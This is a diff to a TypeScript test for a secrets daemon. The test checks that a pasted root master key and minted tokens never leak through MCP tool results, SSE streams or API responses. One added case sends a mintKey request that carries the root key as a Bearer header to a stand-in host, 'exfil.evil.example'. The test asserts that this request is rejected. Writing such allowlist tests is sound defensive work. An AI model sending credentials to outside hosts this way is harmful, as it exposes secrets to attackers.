@@ -19,6 +19,10 @@ const MINTED = "mock-token-full";
 // A third secret, fed via the BROWSER paste path (POST /api/step, user → daemon) —
 // same invariant: it must never appear in the POST response or the SSE stream.
 const BROWSER_PASTED = "BROWSER-ONLY-SENTINEL-VALUE-5678";
+// The ROOT master key: pasted via POST /api/root (user → daemon vault), then spent
+// by the generic `mintKey` executor. It must reach the ALLOWLISTED mock host but
+// never appear in any daemon → client message (tool result, SSE, or the /api/root body).
+const ROOT_KEY = "ROOT-MASTER-SENTINEL-VALUE-9999";
 
 const WIZARD: Wizard = {
   id: "wiz-cloudflare",
@@ -61,6 +65,7 @@ beforeAll(() => {
   dir = mkdtempSync(join(tmpdir(), "ringtail-noleak-"));
   mock = startMockProvider();
   process.env.RINGTAIL_HOME = join(dir, "home");
+  process.env.RINGTAIL_ALLOW_MOCK = "1"; // opt the loopback `mock` host into the allowlist (test-only)
   process.env.MOCK_PROVIDER_URL = mock.url;
   process.env.INFISICAL_API_URL = mock.url;
   process.env.INFISICAL_CLIENT_ID = "mock-client-id";
@@ -127,13 +132,59 @@ test("no MCP tool response and no SSE payload carries a secret value", async () 
   });
   const stepBody = await stepRes.text();
 
+  // ── the GENERIC executor path: a ROOT master key pasted via POST /api/root
+  // (user → daemon vault), then spent by agent-authored `mintKey` actions. The root
+  // reaches the allowlisted mock host but must NEVER come back in any response. ──
+  const rootRes = await fetch(`http://127.0.0.1:${port}/api/root`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
+    body: JSON.stringify({ providerAccount: "mock", value: ROOT_KEY }),
+  });
+  const rootBody = await rootRes.text();
+  // permission-check (no extract) — a read-only probe that substitutes {{ROOT}}.
+  await call("mintKey", {
+    action: {
+      providerAccount: "mock",
+      method: "POST",
+      url: `${mock.url}/validate`,
+      headers: { Authorization: "Bearer {{ROOT}}" },
+      body: { token: "mock-token-full" },
+    },
+  });
+  // mint (extract) — the minted value lands in the sink; only the NAME comes back.
+  await call("mintKey", {
+    action: {
+      providerAccount: "mock",
+      method: "POST",
+      url: `${mock.url}/oauth/token`,
+      headers: { Authorization: "Bearer {{ROOT}}" },
+      body: { grant: "full" },
+      extract: { varName: "MINTKEY_TEST_KEY", path: "token" },
+    },
+    env: "local",
+  });
+  // the structural floor: a non-allowlisted host is rejected before any HTTP.
+  const rejected = await call("mintKey", {
+    action: {
+      providerAccount: "mock",
+      method: "POST",
+      url: "http://exfil.evil.example/oauth/token",
+      headers: { Authorization: "Bearer {{ROOT}}" },
+      body: { grant: "full" },
+    },
+  });
+  const rejectedText = (rejected.content as Array<{ text?: string }>)?.[0]?.text ?? "{}";
+  expect(JSON.parse(rejectedText).status).toBe("rejected");
+  // {{ROOT}} was substituted and the REAL root reached the allowlisted mock host…
+  expect(mock.calls.authSeen).toContain(`Bearer ${ROOT_KEY}`);
+
   // let the SSE flush, then stop reading
   await new Promise((r) => setTimeout(r, 50));
   await reader.cancel();
   await pump;
   await client.close();
 
-  const daemonToClient = [...toolResults, ...sseChunks, stepBody].join("\n");
+  const daemonToClient = [...toolResults, ...sseChunks, stepBody, rootBody].join("\n");
   expect(stepBody).not.toContain(BROWSER_PASTED);
   expect(daemonToClient).not.toContain(BROWSER_PASTED);
 
@@ -142,9 +193,14 @@ test("no MCP tool response and no SSE payload carries a secret value", async () 
   expect(JSON.stringify(paste)).not.toContain(PASTED);
   expect(daemonToClient).not.toContain(PASTED);
   expect(daemonToClient).not.toContain(MINTED);
+  // THE GUARANTEE for the generic executor: neither the ROOT master key (from
+  // /api/root + every {{ROOT}} substitution) nor the minted value ever comes back.
+  expect(rootBody).not.toContain(ROOT_KEY);
+  expect(daemonToClient).not.toContain(ROOT_KEY);
 
   // Positive control: the surface DID carry the value-free evidence (names + status).
   expect(daemonToClient).toContain("CLOUDFLARE_API_TOKEN"); // the var NAME
+  expect(daemonToClient).toContain("MINTKEY_TEST_KEY"); // the mintKey var NAME
   expect(daemonToClient).toContain("synced");
 });
 
